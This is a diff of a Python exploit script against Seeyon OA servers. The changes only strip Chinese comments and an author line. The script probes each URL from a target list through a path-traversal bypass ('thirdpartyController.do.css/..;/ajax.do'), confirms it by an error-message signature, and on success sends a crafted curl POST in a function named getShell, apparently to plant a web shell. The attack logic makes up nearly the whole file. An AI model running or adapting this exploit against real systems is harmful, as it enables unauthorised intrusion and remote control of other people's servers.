@@ -2,14 +2,14 @@ import requests
 import os
 requests.packages.urllib3.disable_warnings()
 
-def poc(url):    #使用poc验证
+def poc(url):
     s = requests.session()
     poc = '/seeyon/thirdpartyController.do.css/..;/ajax.do'
     verUrl = str(url).replace(" ","").strip("/").strip() + poc    #url处理，防止出错。
     if '<font id="THROWABLE_MESSAGE">java.lang.NullPointerException:null</font>' in s.get(verUrl,verify=False).text:
          return url
 
-def getShell(vulnUrl):     #调用curl
+def getShell(vulnUrl):
     host = str(vulnUrl).replace("http://","").replace("/","")
     commond = "curl -i -s -k -X $'POST' \
     -H $'Host: {0}' -H $'Connection: close' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: zh-CN,zh;q=0.9' -H $'loginPageURL=; login_locale=zh_CN;' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 3519' \
@@ -29,9 +29,5 @@ if __name__ == '__main__':
         checkUrl = f.readlines()
         for i in checkUrl:
             i = i.strip()
-            if not poc(i) == None:    #poc验证可以不加，但是写都写了，不用怪可惜的。
+            if not poc(i) == None:   
                 getShell(i)
-
-
-#by flywhu
-#2021/1/11
